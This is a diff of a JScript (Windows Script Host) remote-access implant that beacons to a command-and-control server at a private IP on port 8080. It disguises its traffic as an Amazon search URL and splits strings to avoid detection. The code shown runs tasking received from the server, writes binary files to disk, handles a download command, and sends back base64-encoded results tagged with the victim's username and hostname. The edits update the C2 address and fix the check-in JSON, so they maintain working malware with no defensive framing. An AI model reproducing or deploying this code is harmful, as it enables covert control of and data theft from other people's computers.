@@ -1,5 +1,5 @@
 //Define variables
-var ipp  = "192.168.1.6"
+var ipp  = "172.16.113.1"
 var p0rt= "8080"
 var uri = "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books";
 var proto = "ht"+"tp"+":/"+"/"
@@ -68,7 +68,7 @@ function post(home, response) {
 
 function writebinfile(filename, content) {
   var stream = WScript.CreateObject("ADODB.Stream")
-  stream.Open()
+  stream.Open()	
   stream.Type = 1 //adTypeBinary
   stream.Write(content)
   stream.SaveToFile(filename)
@@ -156,7 +156,7 @@ while(true)
       }
     }
 
-    // loop thru all packages
+    // loop thru all packages 
     var packages = jsObject.p
     for(var p in packages) {
       if(packages[p].id == id) { // if this is our package (id = our id)
@@ -210,7 +210,7 @@ while(true)
                fso.DeleteFile(temp + "\\" + id + ".txt", true)
             }
           }
-
+              
           else if(cmnd.split(" ")[0] == "dl") {
             var array = cmnd.split(" ")
             array.shift() //Cuts off the first element in the array
@@ -260,23 +260,20 @@ while(true)
           if(retval == "") {
             retval = "[*] No results to return or error getting result data"
           }
-          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"},';
+          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'","'+rettype+'":"'+b64e(retval)+'"} ] }';
           packages[p].cmnd = "" // set cmnd to blank so we don't accidentally run the same thing twice ...
-        }
+        } 
 
         else { // cmnd is blank
-          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"},'; // idle response
+          checkin += '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","hn":"'+hn+'"} ] }'; // idle response
         }
       }
     }
   }
   catch (e) {
-    checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"},'; //error - set idle checkin
+    checkin = '{ "p":[ {"type": "'+type+'","id": '+id+',"un": "'+un+'","hn": "'+hn+'"} ] }'; //error - set idle checkin
     WScript.Sleep(sleepytime);
   }
-  finally {
-    checkin = checkin.substring(0, checkinh.length - 1)
-    checkin += ' ] }'
-    WScript.Sleep(sleepytime);
-  }
+  WScript.Sleep(sleepytime);
 }
+
